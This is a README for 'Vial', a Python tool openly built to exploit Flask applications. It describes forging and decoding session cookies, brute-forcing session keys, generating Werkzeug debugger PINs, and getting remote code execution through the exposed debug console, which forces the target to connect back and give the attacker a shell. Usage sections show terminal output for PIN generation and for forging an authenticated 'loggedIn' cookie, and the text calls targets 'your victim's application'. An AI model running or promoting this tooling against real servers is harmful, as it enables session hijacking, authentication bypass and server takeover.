# The Vial Project

<p align="center">
    <a href="https://github.com/CopernicusPY/vial/stargazers"><img src="https://img.shields.io/github/stars/CopernicusPY/vial?colorA=363a4f&colorB=b7bdf8&style=for-the-badge"></a>
    <a href="https://github.com/CopernicusPY/vial/issues"><img src="https://img.shields.io/github/issues/CopernicusPY/vial?colorA=363a4f&colorB=f5a97f&style=for-the-badge"></a>
    <a href="https://github.com/CopernicusPY/vial/contributors"><img src="https://img.shields.io/github/contributors/CopernicusPY/vial?colorA=363a4f&colorB=a6da95&style=for-the-badge"></a>
</p>

Vial is a `blazing fast python framework` focused on exploiting [Flask](https://flask.palletsprojects.com/en/2.2.x/) applications. 

It allows efficient session cookie ["forging"](https://en.m.wikipedia.org/wiki/Session_hijacking) and decoding 

(Can be useful for understanding the applications structure). 

It also makes it possible to automatically obtain and bruteforce [session](https://flask.palletsprojects.com/en/2.2.x/quickstart/#sessions) keys.

## Introducing: PIN generation

Stop wasting your time gathering *this* and *that* around your victim's application.
With **Vial**'s new feature you can just sit back and it will do the heavy lifting for you (*at least that's the goal*).
**Vial** now comes with a default configuration file (found under `src/vial/config.toml`)
which contains a list of possible public bits which are required to generate the PIN.
Now, if you already know the private bits then good for you! Just fill the `config.toml` and you are good to go.
I plan on exploiting arbitrary file read in order to automatically obtain private bits for you (we people are lazy).
Read more below (see Usage).

## Introducing: Remote Code Execution

**Vial**'s new feature is the remote code execution utility that abuses [Werkzeug](https://werkzeug.palletsprojects.com/en/2.2.x/)'s [debug console](https://werkzeug.palletsprojects.com/en/2.2.x/debug/), when left activated in a production environment. 

The debugger's console is sometimes protected by a PIN which is generated in the servers side in a [deterministic](https://en.m.wikipedia.org/wiki/Deterministic_algorithm) way using a combination of public and possibly non-public information of the server/website project itself. 

To reverse the PIN these "secret" and "public" bits are required although can be obtained by exploiting other vulnerabilities such as **arbitary file read**/**path traversal** or through phishing campaigns (less common).

**Vial** also accepts already obtained application PIN's. After collecting the PIN it sends a malicious request to the target forcing him to connect to a previously started TCP Server giving the attacker a shell. 

(This can be achieved through manually interacting with the web browser although its better to just stay in your terminal isn't it?)

# Usage

Vial runs as a `python module`.

For a list of all possible options, run the following command

>$ python -m vial

## (NEW) PIN generation
To generate a Werkzeug **PIN** from a configuration file you can use the **PIN** mode.
The `--config/-c` parameter is mandatory for the mode to work. If not provided, vial will throw a critical error and exit.

> **NOTE**
> The configuration file must **STRICTLY** follow the structure of the default. 
> Please do not create your own configuration file if you are not sure and just stick to editing the default one.

```bash
$ python -m vial --config <path/to/config.toml
[?] Select an action [encode/decode/pin]: pin
[17:00:00] INFO     Using config -> config.toml:                                                               utils.py:196
                    {'usernames': ['alice'], 'modnames': ['flask.app', 'werkzeug.debug'], 'appnames':                      
                    ['wsgi_app', 'DebugApplication', 'Flask'], 'paths': [''], 'platform': '', 'node_uuid':                 
                    [''], 'machine_id': ['']}                                                                              
                           Werkzeug Possible PINs                            
┏━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ PINs        ┃ Combinations                                                ┃
┡━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ 145-111-627 │ ('alice', 'flask.app', 'wsgi_app', '', '', '')              │
│ 492-601-742 │ ('alice', 'flask.app', 'DebugApplication', '', '', '')      │
│ 492-117-935 │ ('alice', 'flask.app', 'Flask', '', '', '')                 │
│ 176-573-905 │ ('alice', 'werkzeug.debug', 'wsgi_app', '', '', '')         │
│ 115-518-024 │ ('alice', 'werkzeug.debug', 'DebugApplication', '', '', '') │
│ 459-034-107 │ ('alice', 'werkzeug.debug', 'Flask', '', '', '')            │
└─────────────┴─────────────────────────────────────────────────────────────┘
```

## Fetching and Decoding session cookies

It is possible to locally decode session data since Flask cookies are **signed** rather than **encrypted**. 
For this you can select the `decode`  mode.

Session cookies can be obtained by inspecting HTTP requests using a proxy. The default name for the cookies is simply, `"session"`.

```bash
$ python -m vial
[?] Select an action [decode/encode] decode 
[?] Enter the session cookie eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6ZmFsc2UsImlhdCI6MTY3MDc5MDQyNn0.X0kPhJtL7koucxI_aRBaTee8LoTb23TaV9YteTSb9PU

{"loggedIn": false} 
```

You can also use Vial's automatic session fetching utility by passing the `--from` argument.  

> **Note** 

> Not all pages of a web application return a session.  

> Make sure to pass a **URL** that it does. 

>$ python -m vial --from "https://example.com/login" 

```bash
[?] Select an action [decode/encode] decode 
[INFO] Server returned HTTP 302 (FOUND)  
[INFO] Succesfully fetched session cookie: 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6ZmFsc2UsImlhdCI6MTY3MDc5MDQyNn0.X0kPhJtL7koucxI_aRBaTee8LoTb23TaV9YteTSb9PU 

{"loggedIn": false} 
```

## Signing (Session Forging)

Once you've obtained the server's secret key that was used to encode the session data, you'll be able to forge your own. For this, you can use the `encode` mode.

```bash
$ python -m vial
[?] Select an action [decode/encode] encode
[?] Enter the session data to encode "{'loggedIn': True}"
[?] Enter the secret key secret-key
[INFO] Succesfully forged the cookie

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dnZWRJbiI6dHJ1ZSwiaWF0IjoxNjcwNzkxNTQxfQ.c1HQAnTKOcA7chGpgwEndM4kuA2O-ap_nJWdLNmijw0
```
